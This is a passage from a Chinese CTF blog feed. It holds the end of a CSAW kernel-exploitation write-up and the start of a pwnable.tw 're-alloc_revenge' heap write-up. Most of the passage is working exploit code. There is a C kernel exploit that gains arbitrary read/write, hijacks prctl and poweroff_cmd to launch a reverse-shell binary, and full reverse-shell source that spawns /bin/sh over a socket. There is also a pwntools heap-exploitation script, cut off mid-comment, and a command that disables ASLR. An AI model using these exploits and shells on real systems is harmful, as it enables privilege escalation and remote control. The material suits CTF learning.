class="string">&quot;gettimeofday&quot;</span>;  </span><br><span class="line">   <span class="keyword">if</span> (!vdso_addr) &#123;  </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);  </span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="type">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));  </span><br><span class="line">   <span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);  </span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">return</span> name_addr - vdso_addr;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// create a channel</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/csaw&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open /dev/csaw error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line">    <span class="type">size_t</span> addr = <span class="number">0xffff880000000000</span>;</span><br><span class="line">    <span class="type">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> target_addr;</span><br><span class="line">    <span class="type">size_t</span> vdso_addr;</span><br><span class="line">    <span class="type">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line">    <span class="type">char</span>* local_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// alloc one</span></span><br><span class="line">    alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    ret = ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_args);</span><br><span class="line">    <span class="keyword">if</span>(alloc_args.id == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad alloc\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] alloc an channel at id %d\n&quot;</span>,alloc_args.id);</span><br><span class="line">    <span class="comment">// change its size to get arbitary write</span></span><br><span class="line">    shrink_args.id = alloc_args.id;</span><br><span class="line">    shrink_args.size = <span class="number">0x100</span>+<span class="number">1</span>; <span class="comment">// vul, shrink size is `original size - this size` si we get -1 here</span></span><br><span class="line">    ret = ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] now we have arbitary read/write\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// BEGIN OUR SEARCH</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset = get_gettimeofday_str_offset();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] get offset: %u\n&quot;</span>, offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// search in all mem</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> addr=<span class="number">0xffffffff80000000</span>;addr &lt; <span class="number">0xffffffffffffefff</span>;addr += <span class="number">0x1000</span>) &#123;</span><br><span class="line">    seek_args.id = alloc_args.id;</span><br><span class="line">    seek_args.index = addr<span class="number">-0x10</span>; <span class="comment">// index is actually the begin of the place we want to search.</span></span><br><span class="line">    seek_args.whence = SEEK_SET; <span class="comment">// search from begin</span></span><br><span class="line">    ret = ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">    <span class="comment">// use channel_read to read channel&#x27;s space</span></span><br><span class="line">    read_args.buf = local_buf;</span><br><span class="line">    read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">    read_args.id = alloc_args.id;</span><br><span class="line">    ret = ioctl(fd,CSAW_READ_CHANNEL,&amp;read_args);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(local_buf+offset,<span class="string">&quot;gettimeofday&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] find vdso\n&quot;</span>);</span><br><span class="line">        vdso_addr = addr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] vdso in kernel addr: 0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_base = vdso_addr - <span class="number">0xe04000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base: 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="type">size_t</span> poweroff_cmd_addr = kernel_base + POWEROFF_CMD;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] poweroff_cmd_addr=0x%lx\n&quot;</span>,poweroff_cmd_addr);</span><br><span class="line">    <span class="type">size_t</span> orderly_poweroff_addr = kernel_base + ORDERLY_POWEROFF;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] orderly_poweroff_addr=0x%lx\n&quot;</span>,orderly_poweroff_addr);</span><br><span class="line">    <span class="type">size_t</span> task_prctl_addr = kernel_base + TASK_PRCTL;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] task_prctl_addr=0x%lx\n&quot;</span>,task_prctl_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use arbitary write to hijack poweroff_cmd_addr</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">&#x27;\x0&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf,<span class="string">&quot;/reverse_shell\0&quot;</span>);</span><br><span class="line">    seek_args.id = alloc_args.id;</span><br><span class="line">    seek_args.index = poweroff_cmd_addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_args.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">    write_args.id = alloc_args.id;</span><br><span class="line">    write_args.buf = buf;</span><br><span class="line">    write_args.count = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//write orderly poweroff to prctl&#x27;s func pointer</span></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">&#x27;\0&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)buf = orderly_poweroff_addr;</span><br><span class="line">    seek_args.id = alloc_args.id;</span><br><span class="line">    seek_args.index = task_prctl_addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_args.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">    write_args.id = alloc_args.id;</span><br><span class="line">    write_args.buf = buf;</span><br><span class="line">    write_args.count = <span class="number">0x10</span>;</span><br><span class="line">    ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// now we have hijacked kernel&#x27;s prctl struct</span></span><br><span class="line">    <span class="comment">// fork a new process to call prctl</span></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123; <span class="comment">//fork一个子进程，来触发shell的反弹</span></span><br><span class="line">      prctl(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]open a shell\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;nc -l -p 2333&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反弹shell源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> sockfd,numbytes;</span><br><span class="line">    <span class="type">char</span> buf[BUFSIZ];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">their_addr</span>;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;break!&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>((sockfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>)) == <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We get the sockfd~\n&quot;</span>);</span><br><span class="line">    their_addr.sin_family = AF_INET;</span><br><span class="line">    their_addr.sin_port = htons(<span class="number">2333</span>);</span><br><span class="line">    their_addr.sin_addr.s_addr=inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    bzero(&amp;(their_addr.sin_zero), <span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(connect(sockfd,(<span class="keyword">struct</span> sockaddr*)&amp;their_addr,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr)) == <span class="number">-1</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">0</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">1</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">2</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>感觉这次收获最大的是知道了怎么通过符号调试exp，以及gdb搜索内存的方法。以及一种类似one_gadget的攻击方法：修改prctl结构体为run_cmd函数。这里采用的是将prctl结构体修改为<code>orderly_poweroff</code>并修改其对应的<code>poweroff_cmd</code>为一个能够反弹shell的二进制文件路径。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.its203.com/article/seaaseesa/104695399">https://www.its203.com/article/seaaseesa/104695399</a></p><p><a href="https://sourceware.org/gdb/onlinedocs/gdb/Searching-Memory.html">gdb中find命令</a></p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable-re-alloc_revenge</title>
      <link href="/2022/03/02/pwnable-re-alloc-revenge/"/>
      <url>/2022/03/02/pwnable-re-alloc-revenge/</url>
      
        <content type="html"><![CDATA[<p>和之前题目<a href="https://nicholas-wei.github.io/2022/02/01/pwnable-realloc/">realloc</a>代码部分几乎一样，新增了GOT表不可写，导致堆布局更加复杂。个人觉得能够独立完成这道题(或者看了大致思路之后自己完成堆布局)能够算是堆布局方面至少是中级水平了。</p><span id="more"></span><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>见pwnable.tw上的这一道题<a href="https://nicholas-wei.github.io/2022/02/01/pwnable-realloc/">realloc</a>。这里不再分析。漏洞点在于realloc的可控size，导致UAF。但是我们只能操纵两个堆块。</p><p>关于realloc，有一个特别重要的地方是在新的size比原来的大时，<strong>不会从tcache中取出chunk，而是类似calloc的行为</strong>。这一点十分重要。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>由于无法劫持GOT表，并且申请堆块大小受限，导致泄露libc困难，其实这道题难点就在于泄露libc，之后就是一个UAF解决问题。</p><p>一般而言对于2.27之上的题目，有两种处理办法。</p><p>一是UAF在原先堆布局中伪造一个chunk，再想办法分配到这里，并且释放，之后将unsortedbin中的main_arena地址想办法放到下一个free_chunk中，在爆破4bit，写到stdout泄露libc。这种方法缺点在于堆布局及其复杂，构造难度较大。优点是思路明确，每一步要做什么都很清晰。</p><p>第二种方法是直接拿到tcache头部，free掉。这种方法优点就是完全不需要堆风水，直接partical write fd位置就完事了，但是缺点是改掉了tcache控制块，加上本题对size有限制只能在0x78以下，导致对tcache头部的写入释放等造成难以预期的后果。</p><p>本题选择用第一种方法。在网上看到也有师傅采用<a href="https://www.cjovi.icu/WP/1210.html">劫持tcache头部</a>来做的，脚本比我的简单很多，但是要爆破一个字节(我是半个字节)。没有细看怎么做，毕竟这种复杂的堆风水看起来和自己做一遍也没啥区别。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>以下exp包含了很多很多debug()，这是我自己在调试的时候加的，每个debug()旁边写上了要检查什么内容。在本地做的时候，可以加上这样一条命令，避免每次用gdb的set命令修改好libc。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>这句命令使得内核失去虚拟化地址空间效果。不过在做完之后记得改回来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./re-alloc_revenge&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc.so&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,con,send=<span class="literal">True</span></span>):</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(send==<span class="literal">True</span>):</span><br><span class="line">        io.send(con)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc</span>(<span class="params">index,size,content=<span class="number">0</span></span>):</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span>(size!=<span class="number">0</span>):</span><br><span class="line">        io.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">        io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;brva 0x15FB&quot;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_menu_alloc</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;brva 0x1725\n&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;brva 0x1767\n&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">small_payload = p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">big_payload = p64(<span class="number">0</span>)+p64(<span class="number">0x471</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">io</span>):</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x68</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+big_payload+small_payload*<span class="number">0x4</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x78</span>,p64(<span class="number">0</span>)*<span class="number">3</span>) <span class="comment"># free 0x68 chunk</span></span><br><span class="line">    free(<span class="number">0</span>) <span class="comment"># free 0x78&#x27;s chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x68</span>,big_payload*<span class="number">4</span>)</span><br><span class="line">    realloc(<span class="number">1</span>,<span class="number">0</span>) <span class="comment"># free 1 to wait for partial write  &lt;==== partial write chunk!</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x58</span>,small_payload*<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">0</span>) <span class="comment"># free 0x60&#x27;s chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x78</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+big_payload+small_payload*<span class="number">0x4</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x58</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+big_payload*<span class="number">0x4</span>)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># debug() #should be 2 chunks here and 0x441 present</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x38</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+small_payload*<span class="number">0x2</span>)</span><br><span class="line">        realloc(<span class="number">0</span>,<span class="number">0x78</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+small_payload*<span class="number">0x5</span>) <span class="comment"># free 0x68 chunk</span></span><br><span class="line">        free(<span class="number">0</span>) <span class="comment"># free 0x78&#x27;s chunk</span></span><br><span class="line">    <span class="comment"># debug() # next should be 0x....3xx and 0x441 present</span></span><br><span class="line">    realloc(<span class="number">1</span>,<span class="number">0x68</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x58</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    realloc(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># debug() # check 1 is freed and writable to 0x440</span></span><br><span class="line">    realloc(<span class="number">1</span>,<span class="number">0x58</span>,p8(<span class="number">0x20</span>)) </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x58</span>,p8(<span class="number">0x20</span>)) <span class="comment"># partical write next, and put it on the head of tcache</span></span><br><span class="line">    <span class="comment"># debug() # check put big chunk in tcache</span></span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x10</span>,p8(<span class="number">0</span>)*<span class="number">2</span>) </span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    free(<span class="number">0</span>) <span class="comment"># to get writeable</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x58</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># get large chunk</span></span><br><span class="line">    <span class="comment"># debug() # check get a large chunk</span></span><br><span class="line">    free(<span class="number">0</span>) <span class="comment"># into uns</span></span><br><span class="line">    <span class="comment"># debug() # check into unsortedbin</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># want to put libc into a chunk in bins</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#from tcache</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># debug() # check tcache[0x40] is empty</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment"># from unsortedbin,but will reput tcache shit...</span></span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># from unsortedbin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># put into </span></span><br><span class="line">    <span class="comment"># debug() # check libc is at tcache[0x80]bk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache: </span></span><br><span class="line">    <span class="comment"># 0x80 [  7]: 0x55c05e35a6b0 —▸ 0x55c05e35a630 —▸ 0x55c05e35a5b0 —▸ 0x55c05e35a530 —▸ 0x55c05e35a4b0 —▸ 0x55c05e35a430 —▸ 0x55c05e35a3b0 —▸ 